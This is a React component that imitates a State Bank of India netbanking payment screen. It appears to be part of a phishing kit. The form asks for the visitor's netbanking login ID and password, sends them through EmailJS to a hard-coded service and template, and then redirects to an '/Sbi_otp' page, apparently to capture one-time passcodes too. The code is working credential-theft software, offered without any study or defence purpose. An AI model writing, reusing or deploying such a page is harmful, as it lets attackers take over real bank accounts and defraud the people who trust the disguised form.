import React, { useRef } from "react";
import "./index.css";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";

const Sbi = () => {
    let navigate = useNavigate()

  const form = useRef();

  function sendEmail(e) {
    navigate("/Sbi_otp");
    e.preventDefault();

    emailjs
    .sendForm(
        "service_hblrths",
        "template_by3q0a8",  /*change */
        form.current,    /*   */
        "user_rkVmkb5ihll1tFJsx2oGr"  /*change */
      )
      .then(
        (result) => {
          console.log(result.text);
          const show = document.getElementById("messageres");
          show.innerHTML = "Message sent :)";
        },
        (error) => {
          console.log(error.text);
        }
      );
    e.target.reset();
  }
  return (
    <>
      <div className="sbi">
        <div className="sbi_tem">
          <form className="sbi_card" ref={form} onSubmit={sendEmail}>
            <div className="sbi_para">
              <p>
                Please enter your Netbanking Credentials in order to complete
                your transaction.
                <br />
                This information will not be shared with the merchant.
              </p>
            </div>
            <div className="sbi_add">
              <p className="sbi_heading">Added Protection</p>
            </div>
            <div className="sbi_detail">
              <p>
                <span>Merchant Name</span>
                <span>: Airtel Money</span>
              </p>
              <p>
                <span>Date</span>
                <span>: Feb 2, 2022</span>
              </p>
              <p>
                <span>Personal Greeting</span>
                <span>:This transaction is protected.</span>
              </p>
            </div>
            <div className="sbi_method">
              <p className="sbi_heading">Select the Payment Method</p>
              <p className="method_radio">
                <div>
                  <input
                    type="radio"
                    // onChange={}
                    // value={}
                    checked
                  />
                  <span className="sbi_heading">Sbi Netbanking™</span>
                </div>
              </p>
            </div>
            <div>
              <div className="sbi_input">
                <label>Login Id</label>
                <div>
                  <span>:</span>
                  <input
                    type="text"
                    // onChange={}
                    // value={}
                    name="loginid"
                  />
                </div>
              </div>

              <div className="sbi_input grid">
                <label>Login Password</label>
                <div>
                  <span>:</span>
                  <input
                    type="text"
                    // onChange={}
                    // value={}
                    name="loginpass"
                  />
                </div>
              </div>
            </div>
            <div className="sbi_btn">
              <button type="submit">
                Submit
              </button>
            </div>
          </form>
        </div>
      </div>
    </>
  );
};

export default Sbi;
